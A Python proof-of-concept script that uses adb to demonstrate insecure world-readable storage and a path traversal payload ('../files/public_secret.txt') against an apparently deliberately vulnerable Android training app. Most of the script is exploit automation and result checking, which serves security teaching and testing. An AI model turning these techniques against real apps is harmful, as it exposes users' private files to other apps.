```python
import subprocess
import time
import re
import xml.etree.ElementTree as ET
import threading
import queue
import os

# --- Configuration ---
PACKAGE_NAME = "com.dlh.vulnerapp"
ACTIVITY_NAME = f"{PACKAGE_NAME}/.InsecureFileActivity"

# --- UI Element Coordinates (These might need adjustment based on device/emulator screen size and layout) ---
# To find accurate coordinates for your specific test environment:
# 1. Launch the activity on your device/emulator.
# 2. Run 'adb shell uiautomator dump /sdcard/window_dump.xml'
# 3. Run 'adb pull /sdcard/window_dump.xml'
# 4. Open 'window_dump.xml' and locate the 'bounds' attribute for R.id.fileNameInput, R.id.readButton, R.id.writeButton.
#    The coordinates for 'input tap' should be roughly in the center of these bounds.
# Example bounds: "[0,100][1080,200]" -> Center would be "540 150"
EDITTEXT_FILENAME_INPUT_COORDS = "540 300" # Approximate center of EditText
READ_BUTTON_COORDS = "540 500"          # Approximate center of Read Button
WRITE_BUTTON_COORDS = "540 650"         # Approximate center of Write Button (below read button)


# --- ADB Helper Functions ---
def run_adb_command(command, check_output=True, timeout=10):
    """Executes an ADB shell command and returns its output or None on failure."""
    print(f"[*] Running ADB command: {command}")
    try:
        if check_output:
            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=timeout)
            if result.stdout.strip():
                print(f"[+] Output: {result.stdout.strip()}")
            if result.stderr.strip():
                print(f"[-] Stderr: {result.stderr.strip()}")
            return result.stdout.strip()
        else:
            subprocess.run(command, shell=True, check=True, timeout=timeout)
            return ""
    except subprocess.CalledProcessError as e:
        print(f"[-] ADB command failed: {e}")
        print(f"[-] Stderr: {e.stderr.strip()}")
        return None
    except subprocess.TimeoutExpired:
        print(f"[-] ADB command timed out after {timeout} seconds: {command}")
        return None
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
        return None

class LogcatReader(threading.Thread):
    """
    Reads logcat in a background thread and stores relevant logs.
    Monitors for the app's Toast messages.
    """
    def __init__(self, package_name, stop_event):
        super().__init__()
        self.package_name = package_name
        self.stop_event = stop_event
        self.log_queue = queue.Queue()
        self._process = None

    def run(self):
        # Clear logcat buffer before starting
        run_adb_command("adb logcat -c", check_output=False, timeout=5)
        
        # Start logcat for the specific package, filtering for Toast messages
        # Use pidof to get the current PID for the package if possible, otherwise filter by tag
        # Filtering by Toast:I ensures we catch the specific Toast messages from the app.
        cmd = f"adb logcat --pid=$(adb shell pidof -s {self.package_name} || echo '') -s Toast:I *:S"
        print(f"[*] Starting logcat in background: {cmd}")
        self._process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        
        for line in iter(self._process.stdout.readline, ''):
            if self.stop_event.is_set():
                break
            # Only add lines that contain Toast messages from our package context
            if "Toast" in line and self.package_name in line: 
                self.log_queue.put(line)
        
        self._process.stdout.close()
        # Ensure the subprocess is properly terminated and waited for
        if self._process.poll() is None:
            self._process.terminate()
            self._process.wait(timeout=5)
        print("[*] Logcat reader stopped.")

    def get_logs(self):
        """Retrieves all collected logs from the queue."""
        logs = []
        while not self.log_queue.empty():
            logs.append(self.log_queue.get())
        return logs
    
    def stop(self):
        """Signals the thread to stop and terminates the logcat process."""
        self.stop_event.set()
        if self._process:
            self._process.kill() # Force kill if terminate doesn't work quickly
            self._process.wait()

def find_text_in_uiautomator_dump(resource_id):
    """Dumps UI, pulls it, and searches for text within the specified resource_id."""
    dump_file_remote = "/sdcard/window_dump.xml"
    dump_file_local = "window_dump.xml"

    print(f"[*] Dumping UI to {dump_file_remote}...")
    if run_adb_command(f"adb shell uiautomator dump {dump_file_remote}", timeout=15) is None:
        return None

    print(f"[*] Pulling UI dump to {dump_file_local}...")
    # adb pull might sometimes fail, retry a few times
    for _ in range(3):
        pull_result = run_adb_command(f"adb pull {dump_file_remote} {dump_file_local}", timeout=15)
        if pull_result is not None and os.path.exists(dump_file_local) and os.path.getsize(dump_file_local) > 0:
            break
        print("[*] Retrying adb pull (file might not be ready or empty)...")
        time.sleep(1)
    else:
        print(f"[-] Failed to pull UI dump after multiple attempts or file was empty.")
        return None
    
    # Remove the remote dump file to keep the device clean
    run_adb_command(f"adb shell rm {dump_file_remote}", check_output=False, timeout=5)

    try:
        tree = ET.parse(dump_file_local)
        root = tree.getroot()
        for node in root.iter('node'):
            if node.get('resource-id') == resource_id:
                text_content = node.get('text')
                print(f"[+] Found UI element '{resource_id}' with text: '{text_content}'")
                return text_content
        print(f"[-] UI element '{resource_id}' not found in dump.")
        return None
    except ET.ParseError as e:
        print(f"[-] Failed to parse XML dump: {e}")
        return None
    except FileNotFoundError:
        print(f"[-] UI dump file '{dump_file_local}' not found after successful pull.")
        return None
    except Exception as e:
        print(f"[-] An error occurred during UI dump processing: {e}")
        return None

def main():
    print("--- Starting PoC for InsecureFileActivity vulnerabilities ---")

    # 1. Ensure the app is installed
    app_check = run_adb_command(f"adb shell pm path {PACKAGE_NAME}")
    if not app_check or "package:" not in app_check:
        print(f"[!] {PACKAGE_NAME} is not installed. Please install the app first.")
        return

    # 2. Force stop the app to ensure a clean state
    run_adb_command(f"adb shell am force-stop {PACKAGE_NAME}", check_output=False)
    time.sleep(1)

    # 3. Start logcat in a background thread for Toast verification
    stop_logcat_event = threading.Event()
    logcat_reader = LogcatReader(PACKAGE_NAME, stop_logcat_event)
    logcat_reader.start()
    time.sleep(2) # Give logcat a moment to start and clear its buffer

    # 4. Launch the vulnerable activity
    print(f"\n[*] Launching {ACTIVITY_NAME}...")
    launch_result = run_adb_command(f"adb shell am start -n {ACTIVITY_NAME}", check_output=False)
    if launch_result is None:
        print(f"[-] Failed to launch activity {ACTIVITY_NAME}. Is it exported or a launcher activity?")
        print("    You might need to adjust the manifest or provide proper component details.")
        logcat_reader.stop()
        logcat_reader.join()
        return
    time.sleep(3) # Give the activity time to load and render

    # --- Exploit 1: Insecure Data Storage ---
    print("\n--- Demonstrating Insecure Data Storage ---")
    print("[*] Tapping 'Write' button to create a world-readable file...")
    run_adb_command(f"adb shell input tap {WRITE_BUTTON_COORDS}", check_output=False)
    time.sleep(2) # Give time for file creation and Toast message to appear

    expected_toast_message = "Created world-readable file!"
    expected_secret_content = "This is a world-readable secret!"
    world_readable_file_path = f"/data/data/{PACKAGE_NAME}/files/public_secret.txt"

    # Verify Toast message in logcat
    log_output = logcat_reader.get_logs()
    toast_found = any(expected_toast_message in line for line in log_output)
    
    if toast_found:
        print(f"[+] Logcat verification: '{expected_toast_message}' Toast found.")
    else:
        print(f"[-] Logcat verification: '{expected_toast_message}' Toast NOT found.")
        print("    (This might indicate the file wasn't created or Toast message changed.)")

    print(f"[*] Attempting to read '{world_readable_file_path}' using 'adb shell cat' (as an arbitrary user/app)...")
    file_content = run_adb_command(f"adb shell cat {world_readable_file_path}")

    if file_content and expected_secret_content in file_content:
        print(f"[+] SUCCESS: Insecure Data Storage confirmed! The world-readable file content was: '{file_content}'")
    else:
        print(f"[-] FAILED: Insecure Data Storage not confirmed.")
        print(f"    Expected '{expected_secret_content}', Got '{file_content}'")
        print(f"    Possible reasons: File not created, or file not world-readable, or adb cat failed (e.g., permission denied).")

    # --- Exploit 2: Path Traversal ---
    print("\n--- Demonstrating Path Traversal ---")
    # Using the world-readable file we just created for clear verification of path traversal capability
    path_traversal_payload = "../files/public_secret.txt" 
    expected_path_traversal_read_output = f"File Content:\n{expected_secret_content}"
    file_content_textview_id = f"{PACKAGE_NAME}:id/fileContent"

    print(f"[*] Entering path traversal payload '{path_traversal_payload}' into the EditText...")
    run_adb_command(f"adb shell input tap {EDITTEXT_FILENAME_INPUT_COORDS}", check_output=False)
    time.sleep(0.5)
    # Clear existing text first, then type new text (send many DELETE keyevents)
    run_adb_command(f"adb shell input keyevent KEYCODE_MOVE_END", check_output=False) # Move cursor to end
    for _ in range(50): # Max 50 chars to clear - adjust if filenames are expected to be longer
        run_adb_command(f"adb shell input keyevent KEYCODE_DEL", check_output=False)
    time.sleep(0.5)
    run_adb_command(f"adb shell input text '{path_traversal_payload}'", check_output=False)
    time.sleep(1)

    print("[*] Tapping 'Read' button to trigger the vulnerable readFileVulnerable method...")
    run_adb_command(f"adb shell input tap {READ_BUTTON_COORDS}", check_output=False)
    time.sleep(2) # Give time for file reading and TextView update

    # Verify content of the TextView using uiautomator dump
    actual_textview_content = find_text_in_uiautomator_dump(file_content_textview_id)

    if actual_textview_content and expected_path_traversal_read_output in actual_textview_content:
        print(f"[+] SUCCESS: Path Traversal confirmed! Read '{path_traversal_payload}' via UI and verified TextView content.")
        print(f"    Content displayed: '{actual_textview_content}'")
    else:
        print(f"[-] FAILED: Path Traversal not confirmed.")
        print(f"    Expected TextView content to contain: '{expected_path_traversal_read_output}'")
        print(f"    Actual TextView content: '{actual_textview_content}'")
        print("    Possible reasons: UI element coordinates are off, payload was not correctly entered, or path traversal failed.")

    print("\n--- PoC Finished ---")

    # Stop logcat reader
    logcat_reader.stop()
    logcat_reader.join() # Wait for the thread to finish

if __name__ == "__main__":
    main()
```